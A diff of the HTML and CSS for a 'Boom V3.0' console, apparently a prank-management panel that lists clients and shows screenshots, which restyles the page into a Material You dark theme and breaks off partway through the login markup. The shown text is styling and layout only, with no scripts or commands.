@@ -1,532 +1,1164 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Boom V2 Console</title>
+    <title>Boom V3.0 控制台</title>
     <style>
+        /* ===== Material You 色彩系统（由 JS 动态注入） ===== */
+        :root {
+            --md-sys-color-primary: #d0bcff;
+            --md-sys-color-on-primary: #381e72;
+            --md-sys-color-primary-container: #4f378b;
+            --md-sys-color-on-primary-container: #eaddff;
+            --md-sys-color-secondary: #ccc2dc;
+            --md-sys-color-on-secondary: #332d41;
+            --md-sys-color-secondary-container: #4a4458;
+            --md-sys-color-on-secondary-container: #e8def8;
+            --md-sys-color-tertiary: #efb8c8;
+            --md-sys-color-on-tertiary: #492532;
+            --md-sys-color-tertiary-container: #633b48;
+            --md-sys-color-on-tertiary-container: #ffd8e4;
+            --md-sys-color-error: #f2b8b5;
+            --md-sys-color-on-error: #601410;
+            --md-sys-color-error-container: #8c1d18;
+            --md-sys-color-on-error-container: #f9dedc;
+            --md-sys-color-surface: #1c1b1f;
+            --md-sys-color-on-surface: #e6e1e5;
+            --md-sys-color-surface-variant: #49454f;
+            --md-sys-color-on-surface-variant: #cac4d0;
+            --md-sys-color-outline: #938f99;
+            --md-sys-color-outline-variant: #49454f;
+            --md-sys-color-shadow: #000000;
+            --md-sys-color-scrim: #000000;
+            --md-sys-color-inverse-surface: #e6e1e5;
+            --md-sys-color-inverse-on-surface: #313033;
+            --md-sys-color-inverse-primary: #6750a4;
+            --md-sys-color-surface-tint: #d0bcff;
+            --md-sys-color-surface-1: #1c1b1f;
+            --md-sys-color-surface-2: #1c1b1f;
+            --md-sys-color-surface-3: #1c1b1f;
+            --md-sys-color-surface-4: #1c1b1f;
+            --md-sys-color-surface-5: #1c1b1f;
+            --md-ref-pal-primary100: #ffffff;
+            --md-ref-pal-primary99: #fffbfe;
+            --md-ref-pal-primary95: #f6edff;
+            --md-ref-pal-primary90: #eaddff;
+            --md-ref-pal-primary80: #d0bcff;
+            --md-ref-pal-primary70: #b29af8;
+            --md-ref-pal-primary60: #9a82db;
+            --md-ref-pal-primary50: #7f67be;
+            --md-ref-pal-primary40: #6750a4;
+            --md-ref-pal-primary30: #4f378b;
+            --md-ref-pal-primary20: #381e72;
+            --md-ref-pal-primary10: #21005d;
+            --md-ref-pal-primary0: #000000;
+        }
+
+        /* ===== 基础 ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { min-height: 100%; background: #ede8de; }
+        html { min-height: 100%; }
         body {
-            min-height: 100%;
-            color: #191817;
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background: #ede8de;
-            background-image: -webkit-linear-gradient(top, #faf8f1 0%, #e4ded2 100%);
-            background-image: linear-gradient(to bottom, #faf8f1 0%, #e4ded2 100%);
+            min-height: 100vh;
+            color: var(--md-sys-color-on-surface);
+            font-family: "Noto Sans SC", "PingFang SC", "Microsoft YaHei", "Helvetica Neue", Arial, sans-serif;
+            background: var(--md-sys-color-surface);
             -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
         }
+
+        /* ===== 工具类 ===== */
+        .hidden { display: none !important; }
+        .flex { display: flex; }
+        .items-center { align-items: center; }
+        .justify-between { justify-content: space-between; }
+        .gap-8 { gap: 8px; }
+        .gap-12 { gap: 12px; }
+        .w-full { width: 100%; }
+        .text-sm { font-size: 13px; line-height: 18px; }
+        .text-xs { font-size: 11px; line-height: 15px; }
+        .font-medium { font-weight: 500; }
+        .font-bold { font-weight: 700; }
+        .truncate {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* ===== 页面容器 ===== */
         .page {
-            max-width: 1060px;
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 18px;
+            padding: 16px 20px 32px;
         }
-        .brand {
-            margin: 4px 0 18px;
-            padding-bottom: 14px;
-            border-bottom: 1px solid rgba(25,24,23,0.14);
-            overflow: hidden;
+        @media (max-width: 720px) {
+            .page { padding: 12px 14px 24px; }
         }
-        .brand-mark {
-            float: left;
-            width: 42px;
-            height: 42px;
-            line-height: 42px;
-            text-align: center;
-            color: #fff;
-            font-family: Georgia, "Times New Roman", serif;
-            font-size: 22px;
-            font-weight: bold;
-            background: #8d2822;
-            background-image: -webkit-linear-gradient(top, #b9473e 0%, #7e211d 100%);
-            background-image: linear-gradient(to bottom, #b9473e 0%, #7e211d 100%);
-            border: 1px solid #6f1c18;
+
+        /* ===== 顶部应用栏 ===== */
+        .app-bar {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: rgba(28, 27, 31, 0.85);
+            backdrop-filter: blur(16px) saturate(1.4);
+            -webkit-backdrop-filter: blur(16px) saturate(1.4);
+            border-bottom: 1px solid var(--md-sys-color-outline-variant);
+        }
+        .app-bar-brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .app-bar-avatar {
+            width: 40px;
+            height: 40px;
             border-radius: 12px;
-            box-shadow: 0 1px 0 rgba(255,255,255,0.45) inset, 0 2px 6px rgba(50,35,25,0.28);
-            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
+            background: var(--md-sys-color-primary-container);
+            color: var(--md-sys-color-on-primary-container);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            flex-shrink: 0;
         }
-        .brand-copy { margin-left: 56px; }
-        .eyebrow {
-            color: #8d2822;
-            font-size: 11px;
-            line-height: 14px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        .app-bar-title {
+            font-size: 20px;
+            line-height: 26px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            color: var(--md-sys-color-on-surface);
         }
-        h1 {
-            margin-top: 2px;
-            color: #191817;
-            font-family: Georgia, "Times New Roman", serif;
-            font-size: 30px;
-            line-height: 34px;
-            font-weight: normal;
-            text-shadow: 0 1px 0 rgba(255,255,255,0.72);
+        .app-bar-sub {
+            font-size: 12px;
+            line-height: 16px;
+            color: var(--md-sys-color-on-surface-variant);
+            margin-top: 1px;
         }
-        .subhead {
-            margin-top: 4px;
-            color: #67605a;
-            font-size: 13px;
-            line-height: 18px;
+        .app-bar-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .shell { overflow: hidden; }
-        .left-col {
-            float: left;
-            width: 38%;
-            padding-right: 12px;
+
+        /* ===== 状态指示器 ===== */
+        .status-chip {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 500;
+            background: var(--md-sys-color-surface-variant);
+            color: var(--md-sys-color-on-surface-variant);
+            border: 1px solid var(--md-sys-color-outline-variant);
         }
-        .right-col {
-            float: left;
-            width: 62%;
-            padding-left: 12px;
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
         }
-        .panel {
-            margin-bottom: 16px;
+        .dot-online { background: #4ade80; box-shadow: 0 0 6px rgba(74, 222, 128, 0.45); }
+        .dot-offline { background: #9ca3af; }
+        .dot-connecting { background: #fbbf24; animation: pulse 1.2s infinite; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* ===== 面板 / 卡片 ===== */
+        .card {
+            background: var(--md-sys-color-surface-2);
+            border: 1px solid var(--md-sys-color-outline-variant);
+            border-radius: 20px;
             overflow: hidden;
-            background: #fffaf0;
-            border: 1px solid #cfc2ad;
-            border-radius: 14px;
-            box-shadow: 0 1px 0 rgba(255,255,255,0.9) inset, 0 8px 24px rgba(70,52,35,0.13);
+            margin-bottom: 16px;
+            transition: box-shadow 0.25s ease, transform 0.2s ease;
         }
-        .panel-dark {
-            color: #f7efe0;
-            background: #211f1d;
-            background-image: -webkit-linear-gradient(top, #2b2926 0%, #171615 100%);
-            background-image: linear-gradient(to bottom, #2b2926 0%, #171615 100%);
-            border-color: #161412;
-            box-shadow: 0 1px 0 rgba(255,255,255,0.08) inset, 0 10px 26px rgba(30,24,18,0.22);
+        .card-elevated {
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3), 0 1px 3px 1px rgba(0,0,0,0.15);
         }
-        .panel-title {
-            padding: 14px 16px;
-            color: #2b2926;
-            font-size: 13px;
-            line-height: 18px;
-            font-weight: bold;
+        .card-title {
+            padding: 16px 18px 12px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 1px solid #ded3c3;
-            background: rgba(255,255,255,0.42);
+            color: var(--md-sys-color-on-surface-variant);
+            border-bottom: 1px solid var(--md-sys-color-outline-variant);
         }
-        .panel-dark .panel-title {
-            color: #f7efe0;
-            border-bottom-color: rgba(255,255,255,0.09);
-            background: rgba(255,255,255,0.03);
-        }
-        .panel-body { padding: 16px; }
+        .card-body { padding: 16px 18px; }
+        .card-body > *:last-child { margin-bottom: 0 !important; }
+
+        /* ===== 登录页 ===== */
         .login-screen {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        .login-card {
             width: 100%;
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 84px 18px 20px;
+            max-width: 440px;
+            background: var(--md-sys-color-surface-2);
+            border: 1px solid var(--md-sys-color-outline-variant);
+            border-radius: 28px;
+            padding: 32px;
+            box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
         }
-        .login-screen .panel { margin-bottom: 0; }
+        .login-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .login-avatar {
+            width: 64px;
+            height: 64px;
+            border-radius: 20px;
+            background: var(--md-sys-color-primary-container);
+            color: var(--md-sys-color-on-primary-container);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 700;
+            margin: 0 auto 16px;
+        }
         .login-title {
-            padding-bottom: 16px;
-            color: #191817;
-            font-family: Georgia, "Times New Roman", serif;
-            font-size: 32px;
+            font-size: 28px;
             line-height: 36px;
-            text-align: center;
-            font-weight: normal;
+            font-weight: 500;
+            color: var(--md-sys-color-on-surface);
         }
-        .login-note {
-            margin-bottom: 16px;
-            color: #706860;
-            font-size: 13px;
-            line-height: 18px;
-            text-align: center;
+        .login-sub {
+            font-size: 14px;
+            line-height: 20px;
+            color: var(--md-sys-color-on-surface-variant);
+            margin-top: 6px;
         }
-        .metric {
-            padding: 14px 0;
-            border-bottom: 1px solid rgba(80,68,54,0.14);
+
+        /* ===== 表单控件 ===== */
+        .form-group { margin-bottom: 16px; }
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            color: var(--md-sys-color-on-surface-variant);
+        }
+        .input {
+            width: 100%;
+            min-height: 48px;
+            padding: 12px 16px;
+            font-size: 15px;
+            line-height: 22px;
+            color: var(--md-sys-color-on-surface);
+            background: var(--md-sys-color-surface-variant);
+            border: 1px solid var(--md-sys-color-outline);
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            -webkit-appearance: none;
+            font-family: inherit;
+        }
+        .input::placeholder { color: var(--md-sys-color-on-surface-variant); opacity: 0.6; }
+        .input:focus {
+            border-color: var(--md-sys-color-primary);
+            box-shadow: 0 0 0 3px var(--md-sys-color-primary-container);
+        }
+        select.input {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23cac4d0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 18px;
+            padding-right: 40px;
+        }
+
+        /* ===== Material 3 按钮 ===== */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-height: 40px;
+            padding: 8px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            border-radius: 20px;
+            border: none;
+            cursor: pointer;
+            outline: none;
+            position: relative;
             overflow: hidden;
+            transition: box-shadow 0.2s, transform 0.15s;
+            -webkit-appearance: none;
+            font-family: inherit;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: currentColor;
+            opacity: 0;
+            transition: opacity 0.2s;
+            pointer-events: none;
+        }
+        .btn:hover::after { opacity: 0.08; }
+        .btn:active::after { opacity: 0.12; }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.38; cursor: not-allowed; transform: none; }
+        .btn:disabled::after { display: none; }
+
+        .btn-filled {
+            background: var(--md-sys-color-primary);
+            color: var(--md-sys-color-on-primary);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3), 0 1px 3px 1px rgba(0,0,0,0.15);
+        }
+        .btn-filled:hover { box-shadow: 0 1px 2px rgba(0,0,0,0.3), 0 2px 6px 2px rgba(0,0,0,0.15); }
+
+        .btn-filled-tonal {
+            background: var(--md-sys-color-secondary-container);
+            color: var(--md-sys-color-on-secondary-container);
+        }
+
+        .btn-outlined {
+            background: transparent;
+            color: var(--md-sys-color-primary);
+            border: 1px solid var(--md-sys-color-outline);
+        }
+        .btn-outlined::after { color: var(--md-sys-color-primary); }
+
+        .btn-text {
+            background: transparent;
+            color: var(--md-sys-color-primary);
+            padding: 8px 12px;
+        }
+        .btn-text::after { color: var(--md-sys-color-primary); }
+
+        .btn-error {
+            background: var(--md-sys-color-error-container);
+            color: var(--md-sys-color-on-error-container);
+        }
+        .btn-error-filled {
+            background: var(--md-sys-color-error);
+            color: var(--md-sys-color-on-error);
+        }
+
+        .btn-block { display: flex; width: 100%; }
+        .btn-lg { min-height: 48px; padding: 10px 24px; font-size: 15px; border-radius: 24px; }
+
+        /* ===== 按钮网格 ===== */
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        .button-grid .btn { width: 100%; }
+        @media (max-width: 720px) {
+            .button-grid { grid-template-columns: 1fr; }
+        }
+
+        /* ===== Tab 标签页 ===== */
+        .tabs {
+            display: flex;
+            gap: 4px;
+            padding: 4px;
+            background: var(--md-sys-color-surface-variant);
+            border-radius: 16px;
+            margin-bottom: 16px;
+            overflow-x: auto;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+        .tabs::-webkit-scrollbar { display: none; }
+        .tab-btn {
+            flex: 1;
+            min-width: 80px;
+            padding: 10px 14px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--md-sys-color-on-surface-variant);
+            background: transparent;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: background 0.2s, color 0.2s;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .tab-btn::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: currentColor;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .tab-btn:hover::after { opacity: 0.08; }
+        .tab-btn.active {
+            background: var(--md-sys-color-secondary-container);
+            color: var(--md-sys-color-on-secondary-container);
+            font-weight: 600;
+        }
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; }
+
+        /* ===== 指标 / 信息项 ===== */
+        .metric {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--md-sys-color-outline-variant);
         }
         .metric:first-child { padding-top: 0; }
         .metric:last-child { border-bottom: none; padding-bottom: 0; }
         .metric-label {
-            float: left;
-            width: 42%;
-            color: #766c61;
             font-size: 12px;
-            line-height: 17px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            color: var(--md-sys-color-on-surface-variant);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            flex-shrink: 0;
+            padding-right: 12px;
         }
         .metric-value {
-            float: right;
-            width: 56%;
-            color: #191817;
-            font-family: Menlo, Consolas, "Courier New", monospace;
             font-size: 13px;
-            line-height: 17px;
+            font-weight: 600;
+            color: var(--md-sys-color-on-surface);
             text-align: right;
-            font-weight: bold;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
+            word-break: break-word;
+            font-family: "SF Mono", "Cascadia Mono", "Fira Code", Menlo, Consolas, monospace;
         }
-        .panel-dark .metric { border-bottom-color: rgba(255,255,255,0.09); }
-        .panel-dark .metric-label { color: #b7ad9d; }
-        .panel-dark .metric-value { color: #fff8e8; }
-        .connected { color: #397f35; }
-        .disconnected { color: #a8322c; }
-        .panel-dark .connected { color: #83c47b; }
-        .panel-dark .disconnected { color: #ef8177; }
-        .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            margin-right: 6px;
-            border-radius: 8px;
-            box-shadow: 0 1px 0 rgba(255,255,255,0.6), 0 0 3px rgba(0,0,0,0.35) inset;
-        }
-        .dot-online { background: #4fa245; }
-        .dot-offline { background: #8a837b; }
-        .input {
-            width: 100%;
-            min-height: 43px;
+        .metric-value.connected { color: #4ade80; }
+        .metric-value.disconnected { color: #f87171; }
+        .metric-value.connecting { color: #fbbf24; }
+
+        /* ===== 客户端卡片 ===== */
+        .client-card {
+            background: var(--md-sys-color-surface-1);
+            border: 1px solid var(--md-sys-color-outline-variant);
+            border-radius: 16px;
+            padding: 14px 16px;
             margin-bottom: 12px;
-            padding: 11px 13px;
-            color: #201f1d;
-            font-size: 15px;
-            background: #fffef9;
-            border: 1px solid #bdb09d;
-            border-radius: 10px;
-            outline: none;
-            box-shadow: 0 1px 3px rgba(25,24,23,0.09) inset, 0 1px 0 rgba(255,255,255,0.9);
-            -webkit-appearance: none;
+            transition: box-shadow 0.2s, transform 0.2s;
         }
-        .input:focus {
-            border-color: #8d2822;
-            box-shadow: 0 0 0 2px rgba(141,40,34,0.16), 0 1px 3px rgba(25,24,23,0.09) inset;
-        }
-        select.input { background: #fffef9; }
-        .form-label {
-            display: block;
-            margin: 4px 0 6px;
-            color: #766c61;
-            font-size: 12px;
-            line-height: 16px;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn {
-            display: block;
-            width: 100%;
-            min-height: 43px;
-            margin-bottom: 10px;
-            padding: 11px 13px;
-            color: #2b2926;
-            font-size: 14px;
-            line-height: 18px;
-            font-weight: bold;
-            background: #eee4d2;
-            background-image: -webkit-linear-gradient(top, #fffaf0 0%, #d9cdbb 100%);
-            background-image: linear-gradient(to bottom, #fffaf0 0%, #d9cdbb 100%);
-            border: 1px solid #b5a691;
-            border-radius: 10px;
-            cursor: pointer;
-            text-shadow: 0 1px 0 rgba(255,255,255,0.8);
-            box-shadow: 0 1px 0 rgba(255,255,255,0.88) inset, 0 2px 5px rgba(55,40,28,0.13);
-            -webkit-appearance: none;
-        }
-        .btn:active {
-            background-image: -webkit-linear-gradient(top, #d4c7b4 0%, #fff7eb 100%);
-            background-image: linear-gradient(to bottom, #d4c7b4 0%, #fff7eb 100%);
-        }
-        .btn:disabled { color: #aaa197; cursor: default; }
-        .btn-primary, .btn-danger {
-            color: #fff;
-            border-color: #70201c;
-            background: #8d2822;
-            background-image: -webkit-linear-gradient(top, #bd4a40 0%, #79211d 100%);
-            background-image: linear-gradient(to bottom, #bd4a40 0%, #79211d 100%);
-            text-shadow: 0 -1px 0 rgba(0,0,0,0.42);
-        }
-        .btn-primary:active, .btn-danger:active {
-            background-image: -webkit-linear-gradient(top, #6d1e1a 0%, #ad4038 100%);
-            background-image: linear-gradient(to bottom, #6d1e1a 0%, #ad4038 100%);
-        }
-        .btn-blue {
-            color: #fff;
-            border-color: #314b68;
-            background: #3e6385;
-            background-image: -webkit-linear-gradient(top, #6388a8 0%, #31506d 100%);
-            background-image: linear-gradient(to bottom, #6388a8 0%, #31506d 100%);
-            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
-        }
-        .btn-purple {
-            color: #fff;
-            border-color: #67516a;
-            background: #806a83;
-            background-image: -webkit-linear-gradient(top, #9c86a0 0%, #68536c 100%);
-            background-image: linear-gradient(to bottom, #9c86a0 0%, #68536c 100%);
-            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
-        }
-        .btn-orange {
-            color: #fff;
-            border-color: #85562d;
-            background: #a96f38;
-            background-image: -webkit-linear-gradient(top, #cc9255 0%, #8f5a2b 100%);
-            background-image: linear-gradient(to bottom, #cc9255 0%, #8f5a2b 100%);
-            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
-        }
-        .button-grid { overflow: hidden; margin-left: -5px; margin-right: -5px; }
-        .button-grid .btn {
-            float: left;
-            width: 50%;
-            min-height: 48px;
-            margin: 0 0 10px 0;
-            border-left-width: 5px;
-            border-right-width: 5px;
-            border-left-color: transparent;
-            border-right-color: transparent;
-            border-radius: 0;
-            background-clip: padding-box;
-            -webkit-background-clip: padding-box;
-        }
-        .client-item {
-            margin-bottom: 12px;
-            padding: 13px;
-            background: #fffdf7;
-            border: 1px solid #d5c8b4;
-            border-radius: 12px;
-            box-shadow: 0 1px 0 rgba(255,255,255,0.9) inset, 0 2px 7px rgba(55,40,28,0.08);
+        .client-card:hover {
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2), 0 4px 8px 2px rgba(0,0,0,0.1);
+            transform: translateY(-1px);
         }
         .client-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
             margin-bottom: 10px;
-            padding-bottom: 9px;
-            border-bottom: 1px solid #eadfce;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--md-sys-color-outline-variant);
         }
         .client-id {
-            color: #8d2822;
-            font-family: Menlo, Consolas, "Courier New", monospace;
+            font-family: "SF Mono", "Cascadia Mono", "Fira Code", Menlo, Consolas, monospace;
             font-size: 13px;
-            line-height: 18px;
-            font-weight: bold;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
+            font-weight: 700;
+            color: var(--md-sys-color-primary);
+            word-break: break-all;
         }
-        .client-grid { overflow: hidden; color: #5f5850; font-size: 12px; line-height: 17px; }
-        .client-field {
-            float: left;
-            width: 50%;
-            min-height: 25px;
-            padding: 3px 10px 3px 0;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
+        .client-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 6px 12px;
+            font-size: 12px;
+            line-height: 17px;
+            color: var(--md-sys-color-on-surface-variant);
         }
-        .client-field b { color: #24221f; font-weight: bold; }
+        .client-field b {
+            color: var(--md-sys-color-on-surface);
+            font-weight: 600;
+        }
         .client-meta {
-            clear: both;
-            margin-top: 9px;
-            padding-top: 9px;
-            color: #7d746a;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid var(--md-sys-color-outline-variant);
             font-size: 11px;
             line-height: 16px;
-            border-top: 1px solid #eadfce;
-            word-wrap: break-word;
-            overflow-wrap: break-word;
+            color: var(--md-sys-color-on-surface-variant);
+            word-break: break-word;
         }
-        .control-section, .config-section { display: none; }
-        .empty-note { color: #7d746a; font-size: 13px; line-height: 18px; }
+        @media (max-width: 720px) {
+            .client-grid { grid-template-columns: 1fr; }
+        }
+
+        /* ===== 主题色选择器 ===== */
+        .theme-picker {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .theme-swatch {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: transform 0.2s, box-shadow 0.2s, border-color 0.2s;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .theme-swatch:hover { transform: scale(1.15); }
+        .theme-swatch.active {
+            border-color: var(--md-sys-color-on-surface);
+            box-shadow: 0 0 0 2px var(--md-sys-color-surface), 0 0 0 4px var(--md-sys-color-on-surface);
+        }
+        .theme-swatch-custom {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 2px dashed var(--md-sys-color-outline);
+            background: transparent;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--md-sys-color-on-surface-variant);
+            font-size: 14px;
+            transition: border-color 0.2s, color 0.2s;
+            flex-shrink: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .theme-swatch-custom:hover { border-color: var(--md-sys-color-primary); color: var(--md-sys-color-primary); }
+        .theme-swatch-custom input[type="color"] {
+            position: absolute;
+            inset: -4px;
+            opacity: 0;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border: none;
+            padding: 0;
+        }
+
+        /* ===== 截图弹窗 ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-box {
+            background: var(--md-sys-color-surface-3);
+            border: 1px solid var(--md-sys-color-outline-variant);
+            border-radius: 24px;
+            max-width: 90vw;
+            max-height: 90vh;
+            overflow: hidden;
+            box-shadow: 0 8px 16px 4px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--md-sys-color-outline-variant);
+        }
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--md-sys-color-on-surface);
+        }
+        .modal-body {
+            padding: 12px;
+            overflow: auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-body img {
+            max-width: 85vw;
+            max-height: 78vh;
+            border-radius: 12px;
+            display: block;
+        }
+
+        /* ===== 消息提示 ===== */
         .msg {
             position: fixed;
-            top: 14px;
-            left: 12px;
-            right: 12px;
+            top: 16px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
             z-index: 9999;
-            padding: 12px 15px;
-            color: #fff;
+            padding: 12px 20px;
             font-size: 14px;
-            line-height: 18px;
+            font-weight: 500;
             text-align: center;
-            background: rgba(25,24,23,0.94);
-            border: 1px solid rgba(255,255,255,0.12);
-            border-radius: 11px;
+            background: var(--md-sys-color-inverse-surface);
+            color: var(--md-sys-color-inverse-on-surface);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.25);
             opacity: 0;
-            box-shadow: 0 8px 24px rgba(25,24,23,0.26);
-            -webkit-transition: opacity 0.25s;
-            transition: opacity 0.25s;
+            transition: opacity 0.3s, transform 0.3s;
+            pointer-events: none;
+            max-width: 90vw;
+            word-break: break-word;
         }
-        .msg.show { opacity: 1; }
-        .msg.error { background: rgba(132,32,28,0.96); }
-        .clear { clear: both; }
-        @media (max-width: 720px) {
-            .page { padding: 10px; }
-            .brand { margin-bottom: 12px; padding-bottom: 12px; }
-            .brand-mark { width: 38px; height: 38px; line-height: 38px; border-radius: 10px; }
-            .brand-copy { margin-left: 50px; }
-            h1 { font-size: 24px; line-height: 28px; }
-            .left-col, .right-col { float: none; width: auto; padding: 0; }
-            .panel-body { padding: 13px; }
-            .metric-label, .metric-value { float: none; display: block; width: auto; text-align: left; }
-            .metric-label { margin-bottom: 3px; }
-            .button-grid { margin-left: 0; margin-right: 0; }
-            .button-grid .btn {
-                float: none;
-                width: 100%;
-                border-left-width: 1px;
-                border-right-width: 1px;
-                border-left-color: #b5a691;
-                border-right-color: #b5a691;
-                border-radius: 10px;
-            }
-            .client-field { float: none; width: auto; min-height: 0; padding-right: 0; }
-            .login-screen { padding-top: 44px; }
+        .msg.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .msg.error {
+            background: var(--md-sys-color-error-container);
+            color: var(--md-sys-color-on-error-container);
+        }
+
+        /* ===== 两栏布局 ===== */
+        .shell {
+            display: grid;
+            grid-template-columns: 360px 1fr;
+            gap: 20px;
+            align-items: start;
+        }
+        @media (max-width: 960px) {
+            .shell { grid-template-columns: 1fr; }
+        }
+
+        /* ===== 空状态 ===== */
+        .empty-note {
+            color: var(--md-sys-color-on-surface-variant);
+            font-size: 14px;
+            line-height: 20px;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        /* ===== 分类标题 ===== */
+        .section-title {
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: var(--md-sys-color-on-surface-variant);
+            margin: 18px 0 10px;
+            padding-left: 4px;
+        }
+        .section-title:first-child { margin-top: 0; }
+
+        /* ===== 截图专用按钮 ===== */
+        .btn-screenshot {
+            background: linear-gradient(135deg, #0d7377, #14919b);
+            color: #fff;
         }
     </style>
 </head>
 <body>
+
+    <!-- ===== 登录界面 ===== -->
     <div id="loginScreen" class="login-screen">
-        <div class="brand" style="border-bottom:none;margin-bottom:14px;">
-            <div class="brand-mark">B</div>
-            <div class="brand-copy">
-                <div class="eyebrow">私人专属控制台</div>
-                <h1>Boom V3.0</h1>
-                <div class="subhead">一个轻量级、带服务端版本感知的整蛊管理中心。</div>
+        <div class="login-card">
+            <div class="login-header">
+                <div class="login-avatar">B</div>
+                <div class="login-title">Boom V3.0</div>
+                <div class="login-sub">轻量级整蛊管理中心 · 服务端版本感知</div>
             </div>
-        </div>
-        <div class="panel">
-            <div class="panel-title">身份验证</div>
-            <div class="panel-body">
-                <div style="text-align:left; margin-bottom:10px;">
